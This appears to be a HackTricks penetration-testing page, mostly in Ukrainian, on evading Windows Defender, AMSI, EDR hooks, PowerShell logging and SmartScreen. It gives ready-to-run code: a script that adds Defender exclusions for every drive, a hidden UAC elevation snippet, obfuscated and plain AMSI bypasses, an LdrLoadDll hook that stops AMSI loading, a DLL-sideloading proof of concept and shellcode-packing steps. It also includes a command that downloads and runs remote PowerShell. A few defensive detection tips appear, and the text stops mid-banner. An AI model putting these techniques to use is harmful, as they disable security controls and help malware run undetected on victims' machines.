# Antivirus (AV) Bypass

{{#include ../banners/hacktricks-training.md}}

**Цю сторінку написав** [**@m2rc_p**](https://twitter.com/m2rc_p)**!**

## Зупинити Defender

- [defendnot](https://github.com/es3n1n/defendnot): Інструмент для припинення роботи Windows Defender.
- [no-defender](https://github.com/es3n1n/no-defender): Інструмент для припинення роботи Windows Defender шляхом імітації іншого AV.
- [Вимкнути Defender якщо ви admin](basic-powershell-for-pentesters/README.md)

### Інсталяторна пастка UAC перед втручанням у Defender

Публічні лоадери, що маскуються під ігрові чіти, часто поширюються як непідписані Node.js/Nexe інсталятори, які спочатку **ask the user for elevation** і лише потім нейтралізують Defender. Послідовність проста:

1. Перевіряють наявність адміністративного контексту за допомогою `net session`. Команда виконується успішно лише коли виконавець має admin rights, тому помилка вказує на те, що лоадер працює під звичайним користувачем.
2. Негайно перезапускає себе з `RunAs` verb, щоб викликати очікуваний UAC consent prompt, зберігаючи початковий рядок команд.
```powershell
if (-not (net session 2>$null)) {
powershell -WindowStyle Hidden -Command "Start-Process cmd.exe -Verb RunAs -WindowStyle Hidden -ArgumentList '/c ""`<path_to_loader`>""'"
exit
}
```
Жертви вже вважають, що встановлюють “cracked” програмне забезпечення, тому запит зазвичай приймають, надаючи malware необхідні права для зміни політики Defender.

### Масові виключення `MpPreference` для кожної літери диска

Після підвищення привілеїв, GachiLoader-style chains максимально збільшують сліпі зони Defender замість повного вимкнення сервісу. Loader спочатку завершує GUI watchdog (`taskkill /F /IM SecHealthUI.exe`), а потім додає **надзвичайно широкі виключення**, через які кожен профіль користувача, системний каталог і змінний диск стають неможливими для сканування:
```powershell
$targets = @('C:\Users\', 'C:\ProgramData\', 'C:\Windows\')
Get-PSDrive -PSProvider FileSystem | ForEach-Object { $targets += $_.Root }
$targets | Sort-Object -Unique | ForEach-Object { Add-MpPreference -ExclusionPath $_ }
Add-MpPreference -ExclusionExtension '.sys'
```
Ключові спостереження:

- Цикл обходить кожну змонтовану файлову систему (D:\, E:\, USB sticks тощо), тому **будь-який майбутній payload, що буде скинутий куди-небудь на диск, ігнорується**.
- Виключення за розширенням `.sys` спрямоване в майбутнє — зловмисники залишають за собою опцію завантажувати unsigned drivers пізніше без повторного втручання в Defender.
- Всі зміни потрапляють під `HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions`, що дає можливість наступним стадіям підтвердити, що виключення зберігаються, або розширити їх, не повторно викликаючи UAC.

Оскільки жодна служба Defender не зупиняється, прості health checks продовжують повідомляти «антивірус активний», навіть якщо real-time inspection ніколи не торкається тих шляхів.

## **AV Methodологія уникнення**

Наразі AV використовують різні методи для визначення, чи є файл шкідливим: static detection, dynamic analysis, та для більш просунутих EDRs — behavioural analysis.

### **Статичне виявлення**

Статичне виявлення досягається позначенням відомих шкідливих рядків або масивів байтів у бінарнику чи скрипті, а також вилученням інформації з самого файлу (наприклад, file description, company name, digital signatures, icon, checksum тощо). Це означає, що використання відомих публічних інструментів може легше вас видати, оскільки їх, ймовірно, вже проаналізували і позначили як шкідливі. Є кілька способів обійти такого роду детекцію:

- **Encryption**

Якщо ви зашифруєте бінарник, AV не зможе виявити вашу програму, але вам знадобиться якийсь loader, щоб розшифрувати і виконати програму в пам’яті.

- **Obfuscation**

Іноді достатньо змінити кілька рядків у бінарнику або скрипті, щоб пройти AV, але це може зайняти багато часу залежно від того, що саме ви намагаєтеся обфускувати.

- **Custom tooling**

Якщо ви розробите власні інструменти, не буде відомих сигнатур, але це потребує багато часу і зусиль.

> [!TIP]
> Гарний спосіб перевірити захист Windows Defender на статичне виявлення — це [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck). Він фактично розбиває файл на кілька сегментів і змушує Defender сканувати кожен окремо, таким чином можна точно визначити, які рядки або байти у вашому бінарнику були позначені.

Раджу переглянути цю [YouTube playlist](https://www.youtube.com/playlist?list=PLj05gPj8rk_pkb12mDe4PgYZ5qPxhGKGf) про практичне AV Evasion.

### **Динамічний аналіз**

Динамічний аналіз — це коли AV запускає ваш бінарник у sandbox і спостерігає за шкідливою активністю (наприклад, спроби розшифрувати та прочитати паролі браузера, зробити minidump на LSASS тощо). З цим працювати трохи складніше, але ось кілька речей, які можна зробити, щоб уникнути sandbox-аналізу.

- **Sleep before execution** Залежно від реалізації, це може бути чудовим способом обійти dynamic analysis AV. AV мають дуже мало часу на сканування файлів, щоб не перервати роботу користувача, тому довгі задержки можуть порушити аналіз бінарників. Проблема в тому, що багато sandbox'ів AV можуть пропускати sleep залежно від реалізації.
- **Checking machine's resources** Зазвичай sandbox'и мають дуже мало ресурсів (< 2GB RAM), інакше вони могли б уповільнити машину користувача. Тут можна бути креативним, наприклад, перевіряти температуру CPU або швидкості вентиляторів — не все буде емульовано в sandbox.
- **Machine-specific checks** Якщо ви хочете таргетнути користувача, чия робоча станція приєднана до домену "contoso.local", ви можете перевірити domain комп’ютера на відповідність — якщо не збігається, програма може завершитися.

Виявилось, що computername Sandbox Microsoft Defender — HAL9TH, тож ви можете перевірити ім’я комп’ютера у вашому malware перед детонацією: якщо ім’я HAL9TH, значить ви всередині defender's sandbox і можете завершити програму.

<figure><img src="../images/image (209).png" alt=""><figcaption><p>джерело: <a href="https://youtu.be/StSLxFbVz0M?t=1439">https://youtu.be/StSLxFbVz0M?t=1439</a></p></figcaption></figure>

Декілька дуже корисних порад від [@mgeeky](https://twitter.com/mariuszbit) щодо боротьби із Sandboxes

<figure><img src="../images/image (248).png" alt=""><figcaption><p><a href="https://discord.com/servers/red-team-vx-community-1012733841229746240">Red Team VX Discord</a> #malware-dev канал</p></figcaption></figure>

Як ми вже казали раніше, **public tools** рано чи пізно **будуть виявлені**, тож варто задати собі питання:

Наприклад, якщо ви хочете дампити LSASS, **чи справді вам потрібно використовувати mimikatz**? Або можна скористатися іншим, менш відомим проєктом, який також дампить LSASS.

Правильна відповідь — ймовірно, другий варіант. Беручи mimikatz як приклад, це, можливо, одна з найбільш позначених AV та EDR штук; хоча проєкт крутий, обходити AV із ним — кошмар, тож шукайте альтернативи для досягнення вашої цілі.

> [!TIP]
> Коли змінюєте payloads для уникнення виявлення, обов’язково **вимкніть автоматичну відправку зразків (automatic sample submission)** у defender, і, будь ласка, серйозно — **НЕ ЗАВАНТАЖУЙТЕ НА VIRUSTOTAL**, якщо ваша ціль — довготривала евазія. Якщо хочете перевірити, чи виявляє конкретний AV ваш payload, встановіть його на VM, спробуйте вимкнути automatic sample submission і тестуйте там, поки не будете задоволені результатом.

## EXEs vs DLLs

Коли це можливо, завжди **надавайте пріоритет використанню DLLs для уникнення виявлення** — з мого досвіду, DLL-файли зазвичай **набагато менше виявляються** і аналізуються, тож це дуже простий трюк для уникнення детекції в деяких випадках (якщо ваш payload взагалі може виконуватись як DLL, звісно).

Як видно на цьому зображенні, DLL Payload від Havoc має detection rate 4/26 на antiscan.me, тоді як EXE payload має 7/26 detection rate.

<figure><img src="../images/image (1130).png" alt=""><figcaption><p>antiscan.me порівняння звичайного Havoc EXE payload проти звичайного Havoc DLL</p></figcaption></figure>

Тепер покажемо кілька прийомів, які можна застосувати з DLL-файлами, щоб бути значно прихованішими.

## DLL Sideloading & Proxying

**DLL Sideloading** використовує порядок пошуку DLL, який використовує loader, шляхом розміщення як вразливої програми, так і шкідливого payload поруч один з одним.

Ви можете перевірити програми, вразливі до DLL Sideloading, використовуючи [Siofra](https://github.com/Cybereason/siofra) і наступний powershell скрипт:
```bash
Get-ChildItem -Path "C:\Program Files\" -Filter *.exe -Recurse -File -Name| ForEach-Object {
$binarytoCheck = "C:\Program Files\" + $_
C:\Users\user\Desktop\Siofra64.exe --mode file-scan --enum-dependency --dll-hijack -f $binarytoCheck
}
```
Ця команда виведе список програм, вразливих до DLL hijacking всередині "C:\Program Files\\" та DLL-файли, які вони намагаються завантажити.

Я настійно рекомендую вам **explore DLL Hijackable/Sideloadable programs yourself**, ця техніка досить прихована при правильному виконанні, але якщо ви використовуєте загальновідомі DLL Sideloadable програми, вас можуть легко виявити.

Просто помістивши шкідливий DLL з ім'ям, яке програма очікує завантажити, не завантажить ваш payload, оскільки програма очікує певні конкретні функції всередині цього DLL. Щоб вирішити цю проблему, ми використаємо іншу техніку, звану **DLL Proxying/Forwarding**.

**DLL Proxying** пересилає виклики, які програма робить, із proxy (і шкідливого) DLL до оригінального DLL, зберігаючи функціональність програми і дозволяючи виконати ваш payload.

Я буду використовувати проект [SharpDLLProxy](https://github.com/Flangvik/SharpDllProxy) від [@flangvik](https://twitter.com/Flangvik/)

Ось кроки, які я виконав:
```
1. Find an application vulnerable to DLL Sideloading (siofra or using Process Hacker)
2. Generate some shellcode (I used Havoc C2)
3. (Optional) Encode your shellcode using Shikata Ga Nai (https://github.com/EgeBalci/sgn)
4. Use SharpDLLProxy to create the proxy dll (.\SharpDllProxy.exe --dll .\mimeTools.dll --payload .\demon.bin)
```
Остання команда дасть нам 2 файли: шаблон вихідного коду DLL та оригінальну перейменовану DLL.

<figure><img src="../images/sharpdllproxy.gif" alt=""><figcaption></figcaption></figure>
```
5. Create a new visual studio project (C++ DLL), paste the code generated by SharpDLLProxy (Under output_dllname/dllname_pragma.c) and compile. Now you should have a proxy dll which will load the shellcode you've specified and also forward any calls to the original DLL.
```
<figure><img src="../images/dll_sideloading_demo.gif" alt=""><figcaption></figcaption></figure>

І наш shellcode (encoded with [SGN](https://github.com/EgeBalci/sgn)) і proxy DLL мають 0/26 Detection rate на [antiscan.me](https://antiscan.me)! Я б назвав це успіхом.

<figure><img src="../images/image (193).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Я **рішуче рекомендую** переглянути [S3cur3Th1sSh1t's twitch VOD](https://www.twitch.tv/videos/1644171543) про DLL Sideloading та також [ippsec's video](https://www.youtube.com/watch?v=3eROsG_WNpE), щоб дізнатися більше про те, що ми обговорювали більш детально.

### Зловживання Forwarded Exports (ForwardSideLoading)

Модулі Windows PE можуть експортувати функції, які фактично є "forwarders": замість вказівки на код, запис експорту містить ASCII-рядок у форматі `TargetDll.TargetFunc`. Коли викликач резолює експорт, Windows loader виконає:

- Load `TargetDll` if not already loaded
- Resolve `TargetFunc` from it

Ключові моменти для розуміння:
- If `TargetDll` is a KnownDLL, it is supplied from the protected KnownDLLs namespace (e.g., ntdll, kernelbase, ole32).
- If `TargetDll` is not a KnownDLL, the normal DLL search order is used, which includes the directory of the module that is doing the forward resolution.

Це дозволяє опосередкований примітив sideloading: знайдіть підписаний DLL, який експортує функцію, що переспрямовується до імені модуля, який не є KnownDLL, потім розмістіть цей підписаний DLL поруч із DLL, контрольованим атакуючим, точно з тим самим ім'ям цільового переспрямованого модуля. Коли переспрямований експорт викликається, loader резолює forward і завантажує ваш DLL з тієї ж директорії, виконуючи ваш DllMain.

Example observed on Windows 11:
```
keyiso.dll KeyIsoSetAuditingInterface -> NCRYPTPROV.SetAuditingInterface
```
`NCRYPTPROV.dll` не є KnownDLL, тому він визначається через звичайний порядок пошуку.

PoC (copy-paste):
1) Скопіюйте підписаний системний DLL до папки, доступної для запису
```
copy C:\Windows\System32\keyiso.dll C:\test\
```
2) Помістіть шкідливий `NCRYPTPROV.dll` у той самий каталог. Достатньо мінімального `DllMain`, щоб отримати виконання коду; вам не потрібно реалізовувати форвардовану функцію, щоб викликати `DllMain`.
```c
// x64: x86_64-w64-mingw32-gcc -shared -o NCRYPTPROV.dll ncryptprov.c
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE hinst, DWORD reason, LPVOID reserved){
if (reason == DLL_PROCESS_ATTACH){
HANDLE h = CreateFileA("C\\\\test\\\\DLLMain_64_DLL_PROCESS_ATTACH.txt", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
if(h!=INVALID_HANDLE_VALUE){ const char *m = "hello"; DWORD w; WriteFile(h,m,5,&w,NULL); CloseHandle(h);}
}
return TRUE;
}
```
3) Спровокуйте перенаправлення за допомогою підписаного LOLBin:
```
rundll32.exe C:\test\keyiso.dll, KeyIsoSetAuditingInterface
```
Observed behavior:
- rundll32 (signed) завантажує side-by-side `keyiso.dll` (signed)
- Під час розв'язування `KeyIsoSetAuditingInterface` завантажувач слідує за переадресацією (forward) до `NCRYPTPROV.SetAuditingInterface`
- Після цього завантажувач завантажує `NCRYPTPROV.dll` з `C:\test` та виконує її `DllMain`
- Якщо `SetAuditingInterface` не реалізовано, ви отримаєте помилку "missing API" лише після того, як `DllMain` вже виконалася

Hunting tips:
- Зосередьтеся на перенаправлених експортних записах, де цільовий модуль не є KnownDLL. KnownDLLs перераховані під `HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs`.
- Ви можете перерахувати перенаправлені експорти за допомогою таких інструментів:
```
dumpbin /exports C:\Windows\System32\keyiso.dll
# forwarders appear with a forwarder string e.g., NCRYPTPROV.SetAuditingInterface
```
- Перегляньте інвентар forwarder-ів Windows 11, щоб знайти кандидатів: https://hexacorn.com/d/apis_fwd.txt

Detection/defense ideas:
- Моніторити LOLBins (e.g., rundll32.exe), які завантажують підписані DLL з несистемних шляхів, а потім з цього каталогу завантажують non-KnownDLLs з тією ж базовою назвою
- Сигналізувати про ланцюги процес/модуль, наприклад: `rundll32.exe` → non-system `keyiso.dll` → `NCRYPTPROV.dll` в шляхах, доступних для запису користувачем
- Застосовувати політики цілісності коду (WDAC/AppLocker) і забороняти write+execute у директоріях додатків

## [**Freeze**](https://github.com/optiv/Freeze)

`Freeze is a payload toolkit for bypassing EDRs using suspended processes, direct syscalls, and alternative execution methods`

Ви можете використовувати Freeze для завантаження й виконання вашого shellcode приховано.
```
Git clone the Freeze repo and build it (git clone https://github.com/optiv/Freeze.git && cd Freeze && go build Freeze.go)
1. Generate some shellcode, in this case I used Havoc C2.
2. ./Freeze -I demon.bin -encrypt -O demon.exe
3. Profit, no alerts from defender
```
<figure><img src="../images/freeze_demo_hacktricks.gif" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Ухилення — це лише гра кішки й миші: те, що працює сьогодні, може бути виявлено завтра, тому ніколи не покладайтеся лише на один інструмент; за можливості намагайтеся поєднувати кілька технік обходу виявлення.

## Direct/Indirect Syscalls & SSN Resolution (SysWhispers4)

EDRs часто розміщують **user-mode inline hooks** на `ntdll.dll` syscall stubs. Щоб обійти ці hooks, можна згенерувати **direct** або **indirect** syscall stubs, які завантажують правильний **SSN** (System Service Number) і здійснюють перехід у kernel mode без виконання захопленого export entrypoint.

**Invocation options:**
- **Direct (embedded)**: emit a `syscall`/`sysenter`/`SVC #0` instruction in the generated stub (no `ntdll` export hit).
- **Indirect**: jump into an existing `syscall` gadget inside `ntdll` so the kernel transition appears to originate from `ntdll` (useful for heuristic evasion); **randomized indirect** picks a gadget from a pool per call.
- **Egg-hunt**: avoid embedding the static `0F 05` opcode sequence on disk; resolve a syscall sequence at runtime.

**Hook-resistant SSN resolution strategies:**
- **FreshyCalls (VA sort)**: infer SSNs by sorting syscall stubs by virtual address instead of reading stub bytes.
- **SyscallsFromDisk**: map a clean `\KnownDlls\ntdll.dll`, read SSNs from its `.text`, then unmap (bypasses all in-memory hooks).
- **RecycledGate**: combine VA-sorted SSN inference with opcode validation when a stub is clean; fall back to VA inference if hooked.
- **HW Breakpoint**: set DR0 on the `syscall` instruction and use a VEH to capture the SSN from `EAX` at runtime, without parsing hooked bytes.

Example SysWhispers4 usage:
```bash
# Indirect syscalls + hook-resistant resolution
python syswhispers.py --preset injection --method indirect --resolve recycled

# Resolve SSNs from a clean on-disk ntdll
python syswhispers.py --preset injection --method indirect --resolve from_disk --unhook-ntdll

# Hardware breakpoint SSN extraction
python syswhispers.py --functions NtAllocateVirtualMemory,NtCreateThreadEx --resolve hw_breakpoint
```
## AMSI (Anti-Malware Scan Interface)

AMSI було створено, щоб запобігти "[fileless malware](https://en.wikipedia.org/wiki/Fileless_malware)". Спочатку AVs могли сканувати тільки **files on disk**, тому якщо ви могли якось виконати payloads **directly in-memory**, AV нічого не міг зробити, оскільки не мав достатньої видимості.

Функція AMSI інтегрована в такі компоненти Windows.

- User Account Control, or UAC (elevation of EXE, COM, MSI, or ActiveX installation)
- PowerShell (scripts, interactive use, and dynamic code evaluation)
- Windows Script Host (wscript.exe and cscript.exe)
- JavaScript and VBScript
- Office VBA macros

Вона дозволяє antivirus-рішенням інспектувати поведінку скриптів, надаючи вміст скриптів у вигляді, що не зашифрований і не обфусцований.

Запуск `IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')` призведе до наступного оповіщення Windows Defender.

<figure><img src="../images/image (1135).png" alt=""><figcaption></figcaption></figure>

Зверніть увагу, як воно додає префікс `amsi:` і потім шлях до виконуваного файлу, з якого запущено скрипт — у цьому випадку, powershell.exe

Ми не скидали жодного файлу на диск, але все одно були виявлені in-memory через AMSI.

Крім того, починаючи з **.NET 4.8**, C# код також проходить через AMSI. Це навіть впливає на `Assembly.Load(byte[])` для in-memory виконання. Тому для in-memory виконання, якщо ви хочете обійти AMSI, рекомендовано використовувати нижчі версії .NET (наприклад, 4.7.2 або нижче).

Існує кілька способів обійти AMSI:

- **Obfuscation**

Оскільки AMSI в основному працює через static detections, модифікація скриптів, які ви намагаєтесь завантажити, може бути хорошим способом ухилитися від виявлення.

Однак AMSI має можливість розшифровувати/розобфусцувати скрипти навіть якщо вони мають кілька шарів обфускації, тому обфускація може бути поганим варіантом залежно від того, як вона виконана. Це робить ухилення не таким простим. Хоча іноді достатньо змінити кілька імен змінних — і все буде нормально, тож усе залежить від того, наскільки щось було позначено.

- **AMSI Bypass**

Оскільки AMSI реалізовано шляхом завантаження DLL у процес powershell (також cscript.exe, wscript.exe тощо), з ним можна легко маніпулювати навіть під обмеженим користувачем. Через цю помилку в реалізації AMSI дослідники знайшли кілька способів уникнути AMSI-сканування.

**Forcing an Error**

Примусове відмовлення ініціалізації AMSI (amsiInitFailed) призведе до того, що для поточного процесу жодне сканування не буде ініційоване. Спочатку це розкрив [Matt Graeber](https://twitter.com/mattifestation), і Microsoft розробила сигнатуру, щоб запобігти широкому використанню.
```bash
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```
Достатньо було одного рядка коду powershell, щоб зробити AMSI непридатним для поточного процесу powershell. Звісно, цей рядок був виявлений самим AMSI, тому для використання цієї техніки потрібні деякі модифікації.

Ось модифікований AMSI bypass, який я взяв із цього [Github Gist](https://gist.github.com/r00t-3xp10it/a0c6a368769eec3d3255d4814802b5db).
```bash
Try{#Ams1 bypass technic nº 2
$Xdatabase = 'Utils';$Homedrive = 'si'
$ComponentDeviceId = "N`onP" + "ubl`ic" -join ''
$DiskMgr = 'Syst+@.MÂ£nÂ£g' + 'e@+nt.Auto@' + 'Â£tion.A' -join ''
$fdx = '@ms' + 'Â£InÂ£' + 'tF@Â£' + 'l+d' -Join '';Start-Sleep -Milliseconds 300
$CleanUp = $DiskMgr.Replace('@','m').Replace('Â£','a').Replace('+','e')
$Rawdata = $fdx.Replace('@','a').Replace('Â£','i').Replace('+','e')
$SDcleanup = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $CleanUp,$Homedrive,$Xdatabase))
$Spotfix = $SDcleanup.GetField($Rawdata,"$ComponentDeviceId,Static")
$Spotfix.SetValue($null,$true)
}Catch{Throw $_}
```
Keep in mind, that this will probably get flagged once this post comes out, so you should not publish any code if your plan is staying undetected.

**Memory Patching**

This technique was initially discovered by [@RastaMouse](https://twitter.com/_RastaMouse/) and it involves finding address for the "AmsiScanBuffer" function in amsi.dll (responsible for scanning the user-supplied input) and overwriting it with instructions to return the code for E_INVALIDARG, this way, the result of the actual scan will return 0, which is interpreted as a clean result.

> [!TIP]
> Please read [https://rastamouse.me/memory-patching-amsi-bypass/](https://rastamouse.me/memory-patching-amsi-bypass/) for a more detailed explanation.

There are also many other techniques used to bypass AMSI with powershell, check out [**this page**](basic-powershell-for-pentesters/index.html#amsi-bypass) and [**this repo**](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell) to learn more about them.

### Блокування AMSI шляхом запобігання завантаженню amsi.dll (LdrLoadDll hook)

AMSI is initialised only after `amsi.dll` is loaded into the current process. A robust, language‑agnostic bypass is to place a user‑mode hook on `ntdll!LdrLoadDll` that returns an error when the requested module is `amsi.dll`. As a result, AMSI never loads and no scans occur for that process.

Опис реалізації (x64 C/C++ pseudocode):
```c
#include <windows.h>
#include <winternl.h>

typedef NTSTATUS (NTAPI *pLdrLoadDll)(PWSTR, ULONG, PUNICODE_STRING, PHANDLE);
static pLdrLoadDll realLdrLoadDll;

NTSTATUS NTAPI Hook_LdrLoadDll(PWSTR path, ULONG flags, PUNICODE_STRING module, PHANDLE handle){
if (module && module->Buffer){
UNICODE_STRING amsi; RtlInitUnicodeString(&amsi, L"amsi.dll");
if (RtlEqualUnicodeString(module, &amsi, TRUE)){
// Pretend the DLL cannot be found → AMSI never initialises in this process
return STATUS_DLL_NOT_FOUND; // 0xC0000135
}
}
return realLdrLoadDll(path, flags, module, handle);
}

void InstallHook(){
HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
realLdrLoadDll = (pLdrLoadDll)GetProcAddress(ntdll, "LdrLoadDll");
// Apply inline trampoline or IAT patching to redirect to Hook_LdrLoadDll
// e.g., Microsoft Detours / MinHook / custom 14‑byte jmp thunk
}
```
Примітки
- Працює в PowerShell, WScript/CScript та у власних лоадерах (усе, що в іншому випадку завантажило б AMSI).
- Поєднувати з передачею скриптів через stdin (`PowerShell.exe -NoProfile -NonInteractive -Command -`), щоб уникнути довгих артефактів командного рядка.
- Спостерігалося використання лоадерами, виконуваними через LOLBins (наприклад, `regsvr32`, що викликає `DllRegisterServer`).

The tool **[https://github.com/Flangvik/AMSI.fail](https://github.com/Flangvik/AMSI.fail)** also generates script to bypass AMSI.
The tool **[https://amsibypass.com/](https://amsibypass.com/)** also generates script to bypass AMSI that avoid signature by randomized user-defined function, variables, characters expression and applies random character casing to PowerShell keywords to avoid signature.

**Видалити виявлену сигнатуру**

Ви можете використовувати інструменти, такі як **[https://github.com/cobbr/PSAmsi](https://github.com/cobbr/PSAmsi)** та **[https://github.com/RythmStick/AMSITrigger](https://github.com/RythmStick/AMSITrigger)**, щоб видалити виявлену сигнатуру AMSI з пам'яті поточного процесу. Ці інструменти сканують пам'ять поточного процесу в пошуках сигнатури AMSI, а потім перезаписують її інструкціями NOP, фактично видаляючи її з пам'яті.

**AV/EDR продукти, які використовують AMSI**

Список AV/EDR продуктів, які використовують AMSI, можна знайти в **[https://github.com/subat0mik/whoamsi](https://github.com/subat0mik/whoamsi)**.

**Використовувати PowerShell версії 2**
Якщо ви використовуєте PowerShell версії 2, AMSI не буде завантажено, тому ви зможете виконувати скрипти без їхнього сканування AMSI. Можна зробити так:
```bash
powershell.exe -version 2
```
## PS Logging

PowerShell logging — це функція, яка дозволяє реєструвати всі команди PowerShell, виконані в системі. Це може бути корисно для аудиту та налагодження, але також може стати **проблемою для атакувальників, які хочуть уникнути виявлення**.

Щоб обійти PowerShell logging, можна використовувати такі техніки:

- **Disable PowerShell Transcription and Module Logging**: Для цього можна використати інструмент на кшталт [https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs](https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs).
- **Use Powershell version 2**: Якщо використовувати PowerShell версії 2, AMSI не буде завантажено, тож ви зможете запускати свої скрипти без сканування AMSI. Це можна зробити так: `powershell.exe -version 2`
- **Use an Unmanaged Powershell Session**: Використовуйте [https://github.com/leechristensen/UnmanagedPowerShell](https://github.com/leechristensen/UnmanagedPowerShell) для створення powershell сесії без захисту (саме це використовує `powerpick` з Cobal Strike).


## Обфускація

> [!TIP]
> Декілька технік обфускації покладаються на шифрування даних, що підвищує ентропію бінарника і полегшує його виявлення AVs та EDRs. Будьте обережні з цим і, можливо, застосовуйте шифрування лише до конкретних ділянок коду, які є чутливими або потребують приховування.

### Деобфускація ConfuserEx-захищених .NET бінарних файлів

При аналізі malware, що використовує ConfuserEx 2 (або комерційні форки), часто зустрічаються кілька шарів захисту, які блокують декомпілатори та sandboxes. Наведений нижче робочий процес надійно **відновлює майже оригінальний IL**, який потім можна декомпілювати в C# за допомогою інструментів, таких як dnSpy або ILSpy.

1.  Anti-tampering removal – ConfuserEx шифрує кожне *method body* і дешифрує його в статичному конструкторі модуля (`<Module>.cctor`). Це також змінює PE checksum, тому будь-яка модифікація призведе до краху бінарника. Використовуйте **AntiTamperKiller** для знаходження зашифрованих таблиць метаданих, відновлення XOR-ключів та перезапису чистого assembly:
```bash
# https://github.com/wwh1004/AntiTamperKiller
python AntiTamperKiller.py Confused.exe Confused.clean.exe
```
Вивід містить 6 параметрів anti-tamper (`key0-key3`, `nameHash`, `internKey`), які можуть бути корисні при створенні власного unpacker.

2.  Symbol / control-flow recovery – подайте *clean* файл у **de4dot-cex** (форк de4dot із підтримкою ConfuserEx).
```bash
de4dot-cex -p crx Confused.clean.exe -o Confused.de4dot.exe
```
Параметри:
• `-p crx` – вибрати профіль ConfuserEx 2  
• de4dot відмінить control-flow flattening, відновить початкові namespaces, класи й імена змінних, а також розшифрує константні рядки.

3.  Proxy-call stripping – ConfuserEx замінює прямі виклики методів на легкі оболонки (так звані *proxy calls*) для ще більшого ускладнення декомпіляції. Видаліть їх за допомогою **ProxyCall-Remover**:
```bash
ProxyCall-Remover.exe Confused.de4dot.exe Confused.fixed.exe
```
Після цього кроку ви повинні побачити звичні .NET API, такі як `Convert.FromBase64String` або `AES.Create()` замість непрозорих обгорткових функцій (`Class8.smethod_10`, …).

4.  Manual clean-up – запустіть отримане бінарне в dnSpy, шукайте великі Base64-блоки або використання `RijndaelManaged`/`TripleDESCryptoServiceProvider`, щоб знайти *справжній* payload. Часто malware зберігає його як TLV-кодований масив байтів, ініціалізований всередині `<Module>.byte_0`.

Наведена послідовність відновлює потік виконання **без** необхідності запускати шкідливий зразок — корисно при роботі на офлайн-робочій станції.

> 🛈  ConfuserEx створює користувацький атрибут під назвою `ConfusedByAttribute`, який можна використовувати як IOC для автоматичної триажу зразків.

#### Однорядковий приклад
```bash
autotok.sh Confused.exe  # wrapper that performs the 3 steps above sequentially
```
---

- [**InvisibilityCloak**](https://github.com/h4wkst3r/InvisibilityCloak)**: C# obfuscator**
- [**Obfuscator-LLVM**](https://github.com/obfuscator-llvm/obfuscator): Мета цього проєкту — надати відкритий форк компіляційного набору [LLVM](http://www.llvm.org/), здатний підвищувати безпеку програмного забезпечення через [code obfuscation](<http://en.wikipedia.org/wiki/Obfuscation_(software)>) та tamper-proofing.
- [**ADVobfuscator**](https://github.com/andrivet/ADVobfuscator): ADVobfuscator демонструє, як використовувати мову `C++11/14` для генерації під час компіляції obfuscated code без використання будь-яких зовнішніх інструментів і без модифікації компілятора.
- [**obfy**](https://github.com/fritzone/obfy): Додає шар obfuscated operations, згенерованих фреймворком C++ template metaprogramming, що ускладнить життя тому, хто хоче crack the application.
- [**Alcatraz**](https://github.com/weak1337/Alcatraz)**:** Alcatraz — x64 binary obfuscator, який може obfuscate різні PE-файли, включно з: .exe, .dll, .sys
- [**metame**](https://github.com/a0rtega/metame): Metame — простий metamorphic code engine для довільних виконуваних файлів.
- [**ropfuscator**](https://github.com/ropfuscator/ropfuscator): ROPfuscator — fine-grained code obfuscation framework для мов, що підтримуються LLVM, який використовує ROP (return-oriented programming). ROPfuscator обфускує програму на рівні assembly code, перетворюючи звичайні інструкції в ROP chains, порушуючи наше природне уявлення про нормальний контроль потоку.
- [**Nimcrypt**](https://github.com/icyguider/nimcrypt): Nimcrypt — .NET PE Crypter, написаний на Nim
- [**inceptor**](https://github.com/klezVirus/inceptor)**:** Inceptor може конвертувати існуючі EXE/DLL у shellcode і потім завантажувати їх

## SmartScreen & MoTW

Ви могли бачити цей екран під час завантаження деяких виконуваних файлів з інтернету та їх запуску.

Microsoft Defender SmartScreen — це механізм безпеки, призначений захищати кінцевого користувача від запуску потенційно шкідливих додатків.

<figure><img src="../images/image (664).png" alt=""><figcaption></figcaption></figure>

SmartScreen у основному працює на основі підходу на основі репутації, що означає: рідко завантажувані додатки викликатимуть спрацьовування SmartScreen, повідомляючи і перешкоджаючи кінцевому користувачу виконати файл (хоча файл все ще можна виконати, натиснувши More Info -> Run anyway).

**MoTW** (Mark of The Web) — це [NTFS Alternate Data Stream](<https://en.wikipedia.org/wiki/NTFS#Alternate_data_stream_(ADS)>) з назвою Zone.Identifier, який автоматично створюється при завантаженні файлів з інтернету, разом із URL, з якого було виконане завантаження.

<figure><img src="../images/image (237).png" alt=""><figcaption><p>Перевірка Zone.Identifier ADS для файлу, завантаженого з інтернету.</p></figcaption></figure>

> [!TIP]
> Важливо зауважити, що виконувані файли, підписані **trusted** сертифікатом підпису, **не спричинять спрацьовування SmartScreen**.

Дуже ефективний спосіб запобігти отриманню вашими payloads Mark of The Web — упаковувати їх у якийсь контейнер, наприклад ISO. Це відбувається тому, що Mark-of-the-Web (MOTW) **не може** бути застосований до **non NTFS** томів.

<figure><img src="../images/image (640).png" alt=""><figcaption></figcaption></figure>

[**PackMyPayload**](https://github.com/mgeeky/PackMyPayload/) — інструмент, який пакує payloads у вихідні контейнери, щоб уникнути Mark-of-the-Web.

Example usage:
```bash
PS C:\Tools\PackMyPayload> python .\PackMyPayload.py .\TotallyLegitApp.exe container.iso

+      o     +              o   +      o     +              o
+             o     +           +             o     +         +
o  +           +        +           o  +           +          o
-_-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-_-_-_-_-_-_-_,------,      o
:: PACK MY PAYLOAD (1.1.0)       -_-_-_-_-_-_-|   /\_/\
